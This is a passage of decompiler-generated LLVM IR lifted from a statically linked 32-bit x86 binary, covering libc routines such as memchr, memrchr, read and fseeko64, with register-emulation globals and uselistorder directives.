  %v7_804fb74 = icmp ult i32 %v1_804fb6f, %v1_804fb74
  br i1 %v7_804fb74, label %dec_label_pc_804fb51, label %dec_label_pc_804fb78

dec_label_pc_804fb78:                             ; preds = %dec_label_pc_804fb6f, %dec_label_pc_804fb40
  %v0_804fb7e = phi i32 [ -1, %dec_label_pc_804fb40 ], [ %v2_804fb72, %dec_label_pc_804fb6f ]
  store i32 %v0_804fb7e, i32* %eax.global-to-local, align 4
  %v2_804fb81 = load i32, i32* %stack_var_-16, align 4
  store i32 %v2_804fb81, i32* @esi, align 4
  store i32 %v0_804f5de, i32* @edi, align 4
  store i32 %v0_804f5dd, i32* @ebp, align 4
  ret i32 %v0_804fb7e

; uselistorder directives
  uselistorder i32 %v0_804fb7e, { 1, 0 }
  uselistorder i32 %v2_804fb01, { 1, 0, 2, 4, 3, 5 }
  uselistorder i32 %v2_804fafe, { 1, 0 }
  uselistorder i32 %v1_804fad0, { 1, 2, 0 }
  uselistorder i32 %v0_804face, { 1, 0 }
  uselistorder i32 %v0_804fb49, { 1, 3, 2, 4, 0 }
  uselistorder i32 %v9_804fa94, { 3, 2, 1, 0, 4 }
  uselistorder i8 %storemerge9, { 1, 0 }
  uselistorder i32 %v0_804fa5d, { 2, 1, 0, 3 }
  uselistorder i32 %v2_804fa36, { 1, 0 }
  uselistorder i32 %v1_804fa36, { 1, 0, 2 }
  uselistorder i32 %v2_804fa34, { 2, 0, 1, 3, 4 }
  uselistorder i32 %v0_804f9f1, { 1, 0 }
  uselistorder i32 %v2_804f95e, { 2, 1, 3, 0 }
  uselistorder i32 %v2_804f958, { 1, 2, 0, 3, 4 }
  uselistorder i32 %v1_804f9b5, { 4, 0, 3, 1, 2, 5, 6, 7 }
  uselistorder i32 %v1_804f8f4, { 1, 0 }
  uselistorder i32 %v0_804f8ef, { 1, 2, 0, 3 }
  uselistorder i32 %v2_804f8bc, { 1, 2, 3, 0, 4 }
  uselistorder i8 %v2_804f8b7, { 1, 0 }
  uselistorder i8 %v2_804f8b0, { 1, 2, 3, 0, 4 }
  uselistorder i32 %v0_804f8b0, { 1, 0, 3, 2 }
  uselistorder i32 %stack_var_-220.3, { 1, 0 }
  uselistorder i32 %v0_804f83a, { 1, 2, 0 }
  uselistorder i32 %stack_var_-42.0, { 0, 2, 1 }
  uselistorder i8 %stack_var_-207.1, { 4, 3, 1, 5, 0, 2 }
  uselistorder i8 %v4_804f81f, { 1, 0 }
  uselistorder i32 %tmp195, { 3, 1, 2, 0 }
  uselistorder x86_fp80 %v3_804f7ea, { 1, 0 }
  uselistorder i32 %v2_804f7a3, { 2, 1, 0 }
  uselistorder i32 %v0_804f859, { 1, 2, 0, 3 }
  uselistorder x86_fp80 %v1_804f775, { 1, 0 }
  uselistorder x86_fp80 %v3_804f757, { 2, 0, 1, 3, 6, 7, 5, 8, 4, 9, 10 }
  uselistorder i32 %v3_804f754, { 1, 0 }
  uselistorder x86_fp80 %v4_804f73c, { 2, 0, 1, 3, 4 }
  uselistorder x86_fp80 %v3_804f736, { 1, 2, 0 }
  uselistorder i32 %v3_804f733, { 1, 0 }
  uselistorder i32 %v1_804f72c, { 3, 0, 1, 2 }
  uselistorder i32 %stack_var_-220.0, { 2, 0, 1 }
  uselistorder x86_fp80 %v1_804f765, { 8, 1, 2, 5, 3, 4, 6, 0, 7, 9 }
  uselistorder x86_fp80 %v2_804f72d, { 1, 0 }
  uselistorder i8 %v4_804f6dd, { 1, 0 }
  uselistorder i3 %v1_804f67a, { 1, 0, 2 }
  uselistorder i8 %stack_var_-207.0, { 3, 2, 0, 4, 5, 1, 6, 7 }
  uselistorder i8 %v3_804f602, { 1, 0, 2, 3 }
  uselistorder i32 %v3_804f5fb, { 1, 0, 2 }
  uselistorder i3 %v4_804f5f4, { 0, 2, 1, 3 }
  uselistorder i32* %stack_var_-144, { 1, 0, 2 }
  uselistorder i32* %stack_var_-72, { 1, 0, 2 }
  uselistorder i32* %stack_var_-71, { 1, 0 }
  uselistorder i32* %stack_var_-132, { 2, 0, 1 }
  uselistorder i32* %stack_var_-27, { 1, 0 }
  uselistorder i32* %stack_var_-152, { 0, 1, 4, 2, 3 }
  uselistorder i32* %stack_var_-168, { 1, 0 }
  uselistorder i32 %tmp156, { 14, 13, 12, 11, 10, 9, 8, 7, 0, 6, 1, 2, 3, 5, 4 }
  uselistorder x86_fp80 %tmp155, { 3, 2, 1, 0, 4, 5 }
  uselistorder x86_fp80* %st1.global-to-local, { 4, 3, 5, 1, 7, 9, 10, 12, 2, 8, 6, 0, 11 }
  uselistorder x86_fp80* %st0.global-to-local, { 5, 2, 3, 4, 6, 7, 1, 0, 8 }
  uselistorder i3* %fpu_stat_TOP.global-to-local, { 0, 4, 5, 6, 7, 8, 1, 9, 10, 2, 3 }
  uselistorder i32* %esi.global-to-local, { 2, 0, 1, 3, 4, 6, 8, 7, 5, 9, 10, 11, 12 }
  uselistorder i32* %edx.global-to-local, { 0, 1, 2, 3, 4, 5, 25, 6, 7, 10, 12, 11, 13, 8, 9, 14, 17, 15, 18, 16, 19, 20, 21, 22, 23, 28, 24, 26, 27 }
  uselistorder i32* %edi.global-to-local, { 0, 2, 3, 1, 5, 4, 6, 7, 9, 8, 10 }
  uselistorder i32* %ebx.global-to-local, { 0, 1, 2, 3, 4, 6, 7, 5, 8, 9, 10, 11, 26, 12, 13, 27, 14, 15, 16, 17, 21, 22, 18, 19, 20, 23, 24, 25, 28, 29 }
  uselistorder i32* %ebp.global-to-local, { 0, 1, 4, 5, 2, 7, 6, 3, 8, 9, 10 }
  uselistorder i32* %eax.global-to-local, { 0, 1, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 2, 3, 19, 20, 21, 22, 23, 24, 25, 26, 27, 28, 29, 30, 31, 32 }
  uselistorder i8 8, { 2, 3, 4, 5, 0, 6, 7, 1 }
  uselistorder i32 160, { 2, 1, 0, 3 }
  uselistorder i64 10, { 1, 0, 2 }
  uselistorder i64 4294967296, { 0, 2, 1, 3, 4, 5, 6, 7, 8, 9, 10 }
  uselistorder i8 43, { 2, 0, 1 }
  uselistorder i8 45, { 2, 3, 1, 0, 4 }
  uselistorder i8 16, { 3, 4, 5, 0, 1, 2 }
  uselistorder i32 176, { 1, 2, 0, 3 }
  uselistorder i32 112, { 4, 5, 6, 2, 0, 1, 3 }
  uselistorder i32* @esp, { 24, 25, 5, 26, 27, 28, 29, 6, 30, 31, 32, 33, 9, 34, 35, 36, 10, 37, 11, 38, 39, 40, 41, 42, 43, 44, 45, 46, 47, 48, 49, 50, 8, 51, 12, 52, 53, 54, 55, 56, 57, 58, 59, 60, 61, 62, 63, 7, 64, 65, 66, 67, 13, 0, 1, 68, 14, 69, 70, 71, 72, 73, 74, 15, 76, 77, 78, 79, 80, 81, 82, 17, 83, 84, 85, 86, 87, 23, 88, 89, 90, 91, 92, 93, 94, 95, 96, 97, 19, 98, 99, 100, 20, 101, 16, 102, 103, 104, 105, 106, 107, 21, 108, 109, 110, 111, 112, 113, 114, 115, 116, 117, 118, 119, 120, 18, 121, 122, 123, 124, 125, 126, 22, 127, 128, 129, 130, 131, 132, 133, 134, 135, 136, 137, 138, 139, 140, 141, 142, 143, 144, 145, 146, 147, 2, 3, 4, 75 }
  uselistorder i32 (i8*, i32, i32)* @__GI_memset, { 0, 1, 2, 4, 7, 5, 6, 9, 8, 3 }
  uselistorder i32 48, { 0, 7, 4, 1, 5, 6, 10, 11, 12, 13, 14, 3, 2, 15, 16, 17, 9, 8 }
  uselistorder i8 102, { 2, 3, 1, 0 }
  uselistorder i8 103, { 1, 2, 0 }
  uselistorder i32 101, { 1, 0, 2 }
  uselistorder i8 48, { 12, 13, 0, 8, 1, 14, 9, 10, 2, 11, 3, 5, 6, 4, 7, 15 }
  uselistorder i32 10, { 8, 9, 14, 0, 12, 1, 15, 2, 22, 23, 24, 25, 26, 27, 3, 10, 16, 4, 6, 28, 7, 20, 21, 11, 29, 17, 18, 19, 13, 5 }
  uselistorder i32 9, { 6, 7, 12, 8, 9, 10, 11, 13, 14, 15, 16, 2, 1, 5, 3, 4, 0 }
  uselistorder i16 256, { 0, 3, 1, 2 }
  uselistorder x86_fp80 0xK401CEE6B280000000000, { 1, 2, 0 }
  uselistorder i32 4096, { 0, 8, 9, 4, 7, 1, 2, 10, 3, 5, 6 }
  uselistorder i32 13, { 0, 5, 1, 4, 2, 3 }
  uselistorder x86_fp80 0xK3FFD8000000000000000, { 1, 0, 2, 3 }
  uselistorder i32 32, { 34, 35, 36, 0, 37, 38, 39, 40, 41, 42, 43, 3, 44, 28, 46, 1, 47, 48, 19, 21, 49, 50, 51, 57, 58, 52, 53, 20, 54, 55, 56, 29, 30, 59, 22, 33, 5, 4, 6, 7, 31, 8, 9, 45, 10, 11, 12, 13, 14, 2, 16, 15, 24, 26, 18, 17, 25, 27, 23, 32 }
  uselistorder x86_fp80 0xK00000000000000000000, { 0, 2, 3, 4, 1 }
  uselistorder i32 12, { 26, 27, 28, 29, 30, 31, 32, 33, 0, 20, 21, 34, 35, 48, 36, 49, 37, 1, 2, 38, 39, 9, 10, 40, 3, 98, 50, 51, 52, 4, 53, 19, 41, 5, 99, 54, 55, 64, 23, 22, 11, 6, 12, 13, 14, 15, 16, 17, 18, 25, 42, 57, 56, 43, 44, 65, 66, 67, 68, 69, 70, 71, 72, 73, 74, 75, 76, 77, 78, 79, 80, 81, 82, 83, 84, 85, 86, 87, 88, 89, 90, 91, 92, 93, 94, 95, 96, 24, 97, 58, 59, 60, 61, 45, 46, 7, 47, 62, 8, 63 }
  uselistorder i32 6, { 8, 12, 13, 4, 5, 3, 14, 15, 0, 1, 6, 11, 9, 10, 7, 16, 2 }
  uselistorder i8 32, { 7, 0, 5, 8, 9, 10, 14, 15, 16, 17, 18, 19, 20, 21, 11, 12, 13, 6, 2, 3, 1, 4 }
  uselistorder label %dec_label_pc_804fb4b, { 2, 1, 0 }
  uselistorder label %dec_label_pc_804fb49, { 1, 0 }
  uselistorder label %dec_label_pc_804faca, { 2, 0, 1 }
  uselistorder label %dec_label_pc_804fa77, { 1, 0 }
  uselistorder label %dec_label_pc_804fa4f, { 2, 0, 1 }
  uselistorder label %dec_label_pc_804fa1e, { 1, 0 }
  uselistorder label %dec_label_pc_804fa0b, { 1, 0 }
  uselistorder label %dec_label_pc_804f9f1, { 2, 0, 1 }
  uselistorder label %dec_label_pc_804f9be, { 2, 0, 1 }
  uselistorder label %dec_label_pc_804f9a9, { 1, 0 }
  uselistorder label %dec_label_pc_804f99e, { 1, 0 }
  uselistorder label %dec_label_pc_804f925, { 2, 0, 1 }
  uselistorder label %dec_label_pc_804f917, { 2, 1, 0 }
  uselistorder label %dec_label_pc_804f8dd, { 1, 0 }
  uselistorder label %dec_label_pc_804f8ad.backedge, { 1, 0 }
  uselistorder label %dec_label_pc_804f879, { 1, 0, 2 }
  uselistorder label %dec_label_pc_804f848, { 0, 2, 1 }
  uselistorder label %dec_label_pc_804f833, { 1, 0 }
  uselistorder label %dec_label_pc_804f79f, { 1, 0 }
  uselistorder label %dec_label_pc_804f777, { 2, 0, 1 }
  uselistorder label %dec_label_pc_804f775, { 2, 1, 0 }
  uselistorder label %dec_label_pc_804f765, { 1, 0 }
  uselistorder label %dec_label_pc_804f6f9, { 1, 0 }
  uselistorder label %dec_label_pc_804f622, { 1, 0 }
}

define i32 @__GI_memchr(i8* %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %edi.global-to-local = alloca i32, align 4
  %zf.global-to-local = alloca i1, align 1
  %stack_var_-4 = alloca i32, align 4
  %v0_804fb88 = load i32, i32* @edi, align 4
  store i32 %v0_804fb88, i32* %stack_var_-4, align 4
  store i32 %arg3, i32* @ecx, align 4
  %v4_804fb8f = ptrtoint i8* %arg1 to i32
  store i32 %v4_804fb8f, i32* %edi.global-to-local, align 4
  %v1_804fb97 = icmp eq i32 %arg3, 0
  store i1 %v1_804fb97, i1* %zf.global-to-local, align 1
  br i1 %v1_804fb97, label %dec_label_pc_804fba7, label %dec_label_pc_804fb9b

dec_label_pc_804fb9b:                             ; preds = %entry
  %v2_804fb9b = call i32 @_strlen(i8* %arg1)
  %v3_804fb9b = mul i32 %v2_804fb9b, -1
  %v4_804fb9b = add i32 %v3_804fb9b, -2
  store i32 %v4_804fb9b, i32* @ecx, align 4
  %v0_804fb9d = load i1, i1* %zf.global-to-local, align 1
  br i1 %v0_804fb9d, label %dec_label_pc_804fb9b.dec_label_pc_804fba4_crit_edge, label %dec_label_pc_804fb9f

dec_label_pc_804fb9b.dec_label_pc_804fba4_crit_edge: ; preds = %dec_label_pc_804fb9b
  %v0_804fba4.pre = load i32, i32* %edi.global-to-local, align 4
  %phitmp = add i32 %v0_804fba4.pre, -1
  br label %dec_label_pc_804fba4

dec_label_pc_804fb9f:                             ; preds = %dec_label_pc_804fb9b
  store i32 1, i32* %edi.global-to-local, align 4
  br label %dec_label_pc_804fba4

dec_label_pc_804fba4:                             ; preds = %dec_label_pc_804fb9b.dec_label_pc_804fba4_crit_edge, %dec_label_pc_804fb9f
  %v0_804fba4 = phi i32 [ %phitmp, %dec_label_pc_804fb9b.dec_label_pc_804fba4_crit_edge ], [ 0, %dec_label_pc_804fb9f ]
  %v8_804fba4 = icmp eq i32 %v0_804fba4, 0
  store i1 %v8_804fba4, i1* %zf.global-to-local, align 1
  store i32 %v0_804fba4, i32* %edi.global-to-local, align 4
  %v2_804fba7.pre = load i32, i32* %stack_var_-4, align 4
  br label %dec_label_pc_804fba7

dec_label_pc_804fba7:                             ; preds = %entry, %dec_label_pc_804fba4
  %v0_804fba8 = phi i32 [ 0, %entry ], [ %v0_804fba4, %dec_label_pc_804fba4 ]
  %v2_804fba7 = phi i32 [ %v0_804fb88, %entry ], [ %v2_804fba7.pre, %dec_label_pc_804fba4 ]
  store i32 %v2_804fba7, i32* @edi, align 4
  ret i32 %v0_804fba8

; uselistorder directives
  uselistorder i32 %v0_804fba4, { 2, 0, 1 }
  uselistorder i32 %arg3, { 1, 0 }
  uselistorder label %dec_label_pc_804fba7, { 1, 0 }
  uselistorder label %dec_label_pc_804fba4, { 1, 0 }
}

define i32 @memrchr(i8 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %tmp = trunc i32 %arg2 to i8
  %v4_804fbb1 = urem i32 %arg2, 256
  %v4_804fbbd = sext i8 %arg1 to i32
  %v2_804fbc1 = add i32 %v4_804fbbd, %arg3
  %v1_804fbd37 = icmp eq i32 %arg3, 0
  br i1 %v1_804fbd37, label %dec_label_pc_804fbdb, label %dec_label_pc_804fbd7

dec_label_pc_804fbc5:                             ; preds = %dec_label_pc_804fbd7
  %v1_804fbc5 = add i32 %v0_804fbc5, -1
  %v5_804fbc6 = load i32, i32* @edx, align 4
  %v6_804fbc6 = and i32 %v5_804fbc6, -256
  %v7_804fbc6 = or i32 %v6_804fbc6, %v4_804fbb1
  store i32 %v7_804fbc6, i32* @edx, align 4
  %v1_804fbca = inttoptr i32 %v1_804fbc5 to i8*
  %v2_804fbca = load i8, i8* %v1_804fbca, align 1
  %v15_804fbca = icmp eq i8 %v2_804fbca, %tmp
  br i1 %v15_804fbca, label %dec_label_pc_804fc58, label %dec_label_pc_804fbd2

dec_label_pc_804fbd2:                             ; preds = %dec_label_pc_804fbc5
  %v1_804fbd2 = add i32 %v0_804fbd2, -1
  %v8_804fbd2 = icmp eq i32 %v1_804fbd2, 0
  br i1 %v8_804fbd2, label %dec_label_pc_804fbdb, label %dec_label_pc_804fbd7

dec_label_pc_804fbd7:                             ; preds = %entry, %dec_label_pc_804fbd2
  %v0_804fbd2 = phi i32 [ %v1_804fbd2, %dec_label_pc_804fbd2 ], [ %arg3, %entry ]
  %v0_804fbc5 = phi i32 [ %v1_804fbc5, %dec_label_pc_804fbd2 ], [ %v2_804fbc1, %entry ]
  %v2_804fbd7 = urem i32 %v0_804fbc5, 4
  %v3_804fbd7 = icmp eq i32 %v2_804fbd7, 0
  %v1_804fbd9 = icmp eq i1 %v3_804fbd7, false
  br i1 %v1_804fbd9, label %dec_label_pc_804fbc5, label %dec_label_pc_804fbdb

dec_label_pc_804fbdb:                             ; preds = %dec_label_pc_804fbd2, %dec_label_pc_804fbd7, %entry
  %v0_804fc3e.pr = phi i32 [ 0, %entry ], [ 0, %dec_label_pc_804fbd2 ], [ %v0_804fbd2, %dec_label_pc_804fbd7 ]
  %v0_804fbe0 = phi i32 [ %v2_804fbc1, %entry ], [ %v1_804fbc5, %dec_label_pc_804fbd2 ], [ %v0_804fbc5, %dec_label_pc_804fbd7 ]
  store i32 %v0_804fbe0, i32* @ecx, align 4
  %v2_804fbe4 = mul nuw nsw i32 %v4_804fbb1, 256
  %v2_804fbe7 = or i32 %v2_804fbe4, %v4_804fbb1
  %v2_804fbeb = mul i32 %v2_804fbe7, 65536
  %v2_804fbee = or i32 %v2_804fbeb, %v2_804fbe7
  %v6_804fc4152 = icmp ugt i32 %v0_804fc3e.pr, 3
  br i1 %v6_804fc4152, label %dec_label_pc_804fbf2, label %dec_label_pc_804fc43

dec_label_pc_804fbf2:                             ; preds = %dec_label_pc_804fbdb, %dec_label_pc_804fc3b
  %v0_804fc3b54 = phi i32 [ %v1_804fc3b, %dec_label_pc_804fc3b ], [ %v0_804fc3e.pr, %dec_label_pc_804fbdb ]
  %v0_804fbf253 = phi i32 [ %v1_804fbf2, %dec_label_pc_804fc3b ], [ %v0_804fbe0, %dec_label_pc_804fbdb ]
  %v1_804fbf2 = add i32 %v0_804fbf253, -4
  store i32 %v1_804fbf2, i32* @ecx, align 4
  %v2_804fbf7 = inttoptr i32 %v1_804fbf2 to i32*
  %v3_804fbf7 = load i32, i32* %v2_804fbf7, align 4
  %v4_804fbf7 = xor i32 %v3_804fbf7, %v2_804fbee
  %v1_804fbf9 = add i32 %v4_804fbf7, 2130640639
  %v1_804fbff = sub i32 -1, %v4_804fbf7
  %v2_804fc01 = xor i32 %v1_804fbf9, %v1_804fbff
  %v1_804fc03 = and i32 %v2_804fc01, -2130640640
  %v2_804fc03 = icmp eq i32 %v1_804fc03, 0
  br i1 %v2_804fc03, label %dec_label_pc_804fc3b, label %dec_label_pc_804fc0b

dec_label_pc_804fc0b:                             ; preds = %dec_label_pc_804fbf2
  %v7_804fc0b = or i32 %v1_804fc03, %v4_804fbb1
  %v1_804fc0f = add i32 %v0_804fbf253, -1
  %v2_804fc12 = inttoptr i32 %v1_804fc0f to i8*
  %v3_804fc12 = load i8, i8* %v2_804fc12, align 1
  %v16_804fc12 = icmp eq i8 %v3_804fc12, %tmp
  br i1 %v16_804fc12, label %dec_label_pc_804fc58, label %dec_label_pc_804fc17

dec_label_pc_804fc17:                             ; preds = %dec_label_pc_804fc0b
  %v1_804fc1b = add i32 %v0_804fbf253, -2
  %v2_804fc1e = inttoptr i32 %v1_804fc1b to i8*
  %v3_804fc1e = load i8, i8* %v2_804fc1e, align 1
  %v16_804fc1e = icmp eq i8 %v3_804fc1e, %tmp
  br i1 %v16_804fc1e, label %dec_label_pc_804fc58, label %dec_label_pc_804fc23

dec_label_pc_804fc23:                             ; preds = %dec_label_pc_804fc17
  %v1_804fc27 = add i32 %v0_804fbf253, -3
  %v2_804fc2a = inttoptr i32 %v1_804fc27 to i8*
  %v3_804fc2a = load i8, i8* %v2_804fc2a, align 1
  %v16_804fc2a = icmp eq i8 %v3_804fc2a, %tmp
  br i1 %v16_804fc2a, label %dec_label_pc_804fc58, label %dec_label_pc_804fc2f

dec_label_pc_804fc2f:                             ; preds = %dec_label_pc_804fc23
  %v1_804fc33 = inttoptr i32 %v1_804fbf2 to i8*
  %v2_804fc33 = load i8, i8* %v1_804fc33, align 1
  %v15_804fc33 = icmp eq i8 %v2_804fc33, %tmp
  %v1_804fc35 = icmp eq i1 %v15_804fc33, false
  br i1 %v1_804fc35, label %dec_label_pc_804fc3b, label %dec_label_pc_804fc37

dec_label_pc_804fc37:                             ; preds = %dec_label_pc_804fc2f
  br label %dec_label_pc_804fc58

dec_label_pc_804fc3b:                             ; preds = %dec_label_pc_804fc2f, %dec_label_pc_804fbf2
  %v5_804fc4827 = phi i32 [ %v7_804fc0b, %dec_label_pc_804fc2f ], [ 0, %dec_label_pc_804fbf2 ]
  %v1_804fc3b = add i32 %v0_804fc3b54, -4
  %v6_804fc41 = icmp ugt i32 %v1_804fc3b, 3
  br i1 %v6_804fc41, label %dec_label_pc_804fbf2, label %dec_label_pc_804fc43

dec_label_pc_804fc43:                             ; preds = %dec_label_pc_804fc3b, %dec_label_pc_804fbdb
  %v5_804fc4826.lcssa = phi i32 [ %v4_804fbb1, %dec_label_pc_804fbdb ], [ %v5_804fc4827, %dec_label_pc_804fc3b ]
  %v0_804fbf2.lcssa = phi i32 [ %v0_804fbe0, %dec_label_pc_804fbdb ], [ %v1_804fbf2, %dec_label_pc_804fc3b ]
  %v0_804fc3b.lcssa = phi i32 [ %v0_804fc3e.pr, %dec_label_pc_804fbdb ], [ %v1_804fc3b, %dec_label_pc_804fc3b ]
  br label %dec_label_pc_804fc50

dec_label_pc_804fc47:                             ; preds = %dec_label_pc_804fc50
  %v1_804fc50 = add i32 %v0_804fc50, -1
  %v1_804fc47 = add i32 %v0_804fc47, -1
  %v6_804fc48 = and i32 %v5_804fc48, -256
  %v7_804fc48 = or i32 %v6_804fc48, %v4_804fbb1
  %v1_804fc4c = inttoptr i32 %v1_804fc47 to i8*
  %v2_804fc4c = load i8, i8* %v1_804fc4c, align 1
  %v15_804fc4c = icmp eq i8 %v2_804fc4c, %tmp
  br i1 %v15_804fc4c, label %dec_label_pc_804fc58, label %dec_label_pc_804fc50

dec_label_pc_804fc50:                             ; preds = %dec_label_pc_804fc47, %dec_label_pc_804fc43
  %v5_804fc48 = phi i32 [ %v7_804fc48, %dec_label_pc_804fc47 ], [ %v5_804fc4826.lcssa, %dec_label_pc_804fc43 ]
  %v0_804fc47 = phi i32 [ %v1_804fc47, %dec_label_pc_804fc47 ], [ %v0_804fbf2.lcssa, %dec_label_pc_804fc43 ]
  %v0_804fc50 = phi i32 [ %v1_804fc50, %dec_label_pc_804fc47 ], [ %v0_804fc3b.lcssa, %dec_label_pc_804fc43 ]
  %v10_804fc51 = icmp eq i32 %v0_804fc50, 0
  %v1_804fc54 = icmp eq i1 %v10_804fc51, false
  br i1 %v1_804fc54, label %dec_label_pc_804fc47, label %dec_label_pc_804fc56

dec_label_pc_804fc56:                             ; preds = %dec_label_pc_804fc50
  br label %dec_label_pc_804fc58

dec_label_pc_804fc58:                             ; preds = %dec_label_pc_804fbc5, %dec_label_pc_804fc23, %dec_label_pc_804fc17, %dec_label_pc_804fc0b, %dec_label_pc_804fc47, %dec_label_pc_804fc37, %dec_label_pc_804fc56
  %v0_804fc5b = phi i32 [ %v1_804fbf2, %dec_label_pc_804fc37 ], [ 0, %dec_label_pc_804fc56 ], [ %v1_804fc47, %dec_label_pc_804fc47 ], [ %v1_804fc27, %dec_label_pc_804fc23 ], [ %v1_804fc1b, %dec_label_pc_804fc17 ], [ %v1_804fc0f, %dec_label_pc_804fc0b ], [ %v1_804fbc5, %dec_label_pc_804fbc5 ]
  ret i32 %v0_804fc5b

; uselistorder directives
  uselistorder i32 %v0_804fc50, { 1, 0 }
  uselistorder i32 %v1_804fc3b, { 0, 2, 1 }
  uselistorder i32 %v1_804fbf2, { 2, 0, 3, 4, 5, 1 }
  uselistorder i32 %v0_804fbf253, { 3, 2, 1, 0 }
  uselistorder i32 %v2_804fbe7, { 1, 0 }
  uselistorder i32 %v0_804fbc5, { 1, 0, 2 }
  uselistorder i32 %v2_804fbc1, { 1, 0 }
  uselistorder i32 %v4_804fbb1, { 4, 5, 3, 2, 0, 1 }
  uselistorder i8 %tmp, { 5, 1, 2, 3, 4, 0 }
  uselistorder i32 -3, { 0, 2, 3, 4, 1, 5 }
  uselistorder i32 -2, { 3, 7, 13, 14, 0, 1, 8, 9, 10, 15, 19, 16, 17, 18, 4, 6, 5, 11, 2, 12 }
  uselistorder i32 65536, { 1, 3, 2, 5, 4, 7, 6, 9, 8, 10, 11, 12, 0, 13, 14, 15, 17, 20, 16, 18, 19 }
  uselistorder i32 -256, { 14, 15, 16, 17, 18, 19, 20, 21, 10, 22, 23, 24, 44, 25, 26, 27, 28, 29, 30, 31, 0, 32, 33, 60, 2, 45, 1, 46, 11, 34, 47, 49, 61, 4, 39, 38, 3, 50, 51, 52, 53, 7, 54, 5, 55, 6, 56, 58, 9, 41, 40, 8, 12, 42, 13, 62, 37, 48, 35, 36, 43, 57, 59 }
  uselistorder i32 256, { 5, 6, 7, 0, 1, 8, 2, 9, 10, 11, 12, 13, 14, 15, 16, 17, 46, 18, 19, 20, 21, 22, 23, 24, 25, 26, 27, 28, 29, 47, 30, 31, 32, 33, 34, 45, 35, 48, 52, 49, 36, 37, 53, 38, 39, 4, 50, 51, 3, 40, 41, 42, 43, 44 }
  uselistorder i32 %arg3, { 0, 2, 1 }
  uselistorder label %dec_label_pc_804fc58, { 6, 4, 5, 1, 2, 3, 0 }
  uselistorder label %dec_label_pc_804fbf2, { 1, 0 }
  uselistorder label %dec_label_pc_804fbdb, { 1, 0, 2 }
  uselistorder label %dec_label_pc_804fbd7, { 1, 0 }
}

define i32 @__libc_read(i32 %arg1, i32* %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %edi.global-to-local = alloca i32, align 4
  %stack_var_-4 = alloca i32, align 4
  %v0_804fc5c = load i32, i32* @edi, align 4
  store i32 %v0_804fc5c, i32* %stack_var_-4, align 4
  store i32 %arg1, i32* %edi.global-to-local, align 4
  %v0_804fc6c = load i32, i32* @ebx, align 4
  %v4_804fc74 = call i32 @read(i32 %arg1, i32* %arg2, i32 %arg3)
  store i32 %v0_804fc6c, i32* @ebx, align 4
  store i32 %v4_804fc74, i32* %edi.global-to-local, align 4
  %tmp = icmp ult i32 %v4_804fc74, -4095
  br i1 %tmp, label %dec_label_pc_804fc8c, label %dec_label_pc_804fc80

dec_label_pc_804fc80:                             ; preds = %entry
  %v1_804fc80 = call i32 @__errno_location(i32 %v0_804fc6c)
  %v0_804fc85 = load i32, i32* %edi.global-to-local, align 4
  %v1_804fc85 = sub i32 0, %v0_804fc85
  %v2_804fc87 = inttoptr i32 %v1_804fc80 to i32*
  store i32 %v1_804fc85, i32* %v2_804fc87, align 4
  store i32 -1, i32* %edi.global-to-local, align 4
  br label %dec_label_pc_804fc8c

dec_label_pc_804fc8c:                             ; preds = %entry, %dec_label_pc_804fc80
  %v0_804fc8d = phi i32 [ %v4_804fc74, %entry ], [ -1, %dec_label_pc_804fc80 ]
  %v2_804fc90 = load i32, i32* %stack_var_-4, align 4
  store i32 %v2_804fc90, i32* @edi, align 4
  ret i32 %v0_804fc8d

; uselistorder directives
  uselistorder i32 %v4_804fc74, { 1, 0, 2 }
  uselistorder i32 %v0_804fc6c, { 1, 0 }
  uselistorder label %dec_label_pc_804fc8c, { 1, 0 }
}

define i32 @__GI_fseek(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %v1_804fc9f = ashr i32 %arg2, 31
  %v4_804fca6 = inttoptr i32 %arg1 to i16*
  %v5_804fca6 = call i32 @__GI_fseeko64(i16* %v4_804fca6, i32 %arg2, i32 %v1_804fc9f, i32 %arg3)
  ret i32 %v5_804fca6
}

define i32 @__GI_fseeko64(i16* %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %eax.global-to-local = alloca i32, align 4
  %ebx.global-to-local = alloca i32, align 4
  %stack_var_-28 = alloca i32, align 4
  %stack_var_-44 = alloca i32, align 4
  %v0_804fcb0 = load i32, i32* @ebp, align 4
  %v0_804fcb1 = load i32, i32* @edi, align 4
  %v0_804fcb2 = load i32, i32* @esi, align 4
  %v0_804fcb3 = load i32, i32* @ebx, align 4
  store i32 %arg4, i32* @edi, align 4
  store i32 %arg2, i32* %eax.global-to-local, align 4
  store i32 %arg3, i32* @edx, align 4
  %v4_804fcc3 = ptrtoint i16* %arg1 to i32
  store i32 %v4_804fcc3, i32* @esi, align 4
  store i32 %arg2, i32* %stack_var_-28, align 4
  %tmp = icmp ult i32 %arg4, 3
  br i1 %tmp, label %dec_label_pc_804fce7, label %dec_label_pc_804fcd4

dec_label_pc_804fcd4:                             ; preds = %entry
  %v1_804fcd4 = call i32 @__errno_location(i32 %arg2)
  store i32 %v1_804fcd4, i32* %eax.global-to-local, align 4
  store i32 -1, i32* %ebx.global-to-local, align 4
  %v1_804fcdc = inttoptr i32 %v1_804fcd4 to i32*
  store i32 22, i32* %v1_804fcdc, align 4
  br label %dec_label_pc_804fd8d

dec_label_pc_804fce7:                             ; preds = %entry
  %v1_804fce7 = add i32 %v4_804fcc3, 52
  %v2_804fce7 = inttoptr i32 %v1_804fce7 to i32*
  %v3_804fce7 = load i32, i32* %v2_804fce7, align 4
  %v1_804fcea = icmp eq i32 %v3_804fce7, 0
  %v1_804fcec = icmp eq i1 %v1_804fcea, false
  br i1 %v1_804fcec, label %dec_label_pc_804fd0d, label %dec_label_pc_804fcee

dec_label_pc_804fcee:                             ; preds = %dec_label_pc_804fce7
  %v1_804fcee = add i32 %v4_804fcc3, 56
  store i32 %v1_804fcee, i32* @ebx, align 4
  %v2_804fcf8 = ptrtoint i32* %stack_var_-44 to i32
  store i32 %v2_804fcf8, i32* @eax, align 4
  %v3_804fcfd = call i32 @__pthread_return_void(i32 %v2_804fcf8, i32 134526883)
  store i32 %v3_804fcfd, i32* %eax.global-to-local, align 4
  %v0_804fd02 = load i32, i32* @ebx, align 4
  %v2_804fd05 = call i32 @__pthread_return_0(i32 %v0_804fd02)
